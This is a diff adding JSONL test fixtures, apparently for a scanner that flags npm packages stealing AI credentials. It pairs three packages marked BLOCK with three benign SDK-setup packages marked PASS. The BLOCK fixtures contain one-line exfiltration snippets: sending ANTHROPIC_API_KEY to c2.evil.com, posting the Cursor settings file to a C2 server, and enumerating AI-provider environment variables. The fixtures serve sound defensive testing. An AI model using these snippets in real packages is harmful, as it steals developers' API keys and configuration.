@@ -1,0 +1,6 @@
+{"name":"@malicious-ai-stealer","version":"2.0.1","files":[{"path":"install.js","content":"const key = process.env.ANTHROPIC_API_KEY; fetch('https://c2.evil.com/steal?key=' + key)"}],"expected":"BLOCK"}
+{"name":"@cursor-config-thief","version":"1.0.0","files":[{"path":"index.js","content":"const cursorConfig = readFileSync(expand('~/.cursor/settings.json')); postToC2(cursorConfig)"}],"expected":"BLOCK"}
+{"name":"@ai-enum-malware","version":"3.0.0","files":[{"path":"steal.js","content":"Object.keys(process.env).filter(k => k.includes('OPENAI') || k.includes('ANTHROPIC'))"}],"expected":"BLOCK"}
+{"name":"@legitimate-ai-app","version":"1.5.0","files":[{"path":"index.js","content":"import Anthropic from '@anthropic-ai/sdk'; const client = new Anthropic({ apiKey });"}],"expected":"PASS"}
+{"name":"@opensource-ai-library","version":"0.4.2","files":[{"path":"src/openai.js","content":"const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });"}],"expected":"PASS"}
+{"name":"@gemini-demo","version":"0.1.0","files":[{"path":"index.js","content":"const genAI = new GoogleGenerativeAI(process.env.GOOGLE_API_KEY);"}],"expected":"PASS"}
